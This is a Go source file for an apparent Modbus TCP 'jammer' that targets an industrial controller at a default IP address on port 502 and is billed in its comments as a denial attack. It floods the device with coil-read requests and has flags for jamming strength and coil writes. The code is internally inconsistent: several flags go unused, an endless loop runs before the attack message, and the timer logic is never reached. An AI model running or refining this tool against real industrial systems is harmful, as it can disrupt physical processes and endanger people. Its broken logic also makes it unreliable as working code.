package main

import (
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/goburrow/modbus" //Import the necessary modbus library
)

var (
	ip_address string
	jamming    int
	runtime    int
	coil       int
	coil_val   int
	wait       sync.WaitGroup
)

func init() {
	flag.StringVar(&ip_address, "ip_address", "192.168.7.227", "Enter IP address to target")
	flag.IntVar(&jamming, "jamming", 500, "Number of times the jammer routines created") //More jammer routines = stronger jamming potential
	flag.IntVar(&runtime, "runtime", 1, "How long the attack will run")
	flag.IntVar(&coil, "coil", 0, "The coil position you are writing to")
	flag.IntVar(&coil_val, "coil_val", 1, "The value you are writing to the coil")
}

func reader(target modbus.Client, coil uint16) {

	for {

		result, err := target.ReadCoils(coil, 1)

		if err != nil {
			fmt.Println(err)
		}

		fmt.Println(result)
	}
}

func main() {
	flag.Parse()
	target := ip_address + ":502" //Send Modbus traffic the specified IP on the Modbus port
	handler := modbus.NewTCPClientHandler(target)
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler) //Create a new Modbus connection
	reader(client, 0)

	fmt.Println("Starting denial attack...")

	//Runs the exploit for the specified duration
	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
	go func() {
		<-timer2.C
		fmt.Println("Finished Reading Modbus Coil")
		os.Exit(0)
	}()

	wait.Wait()
}
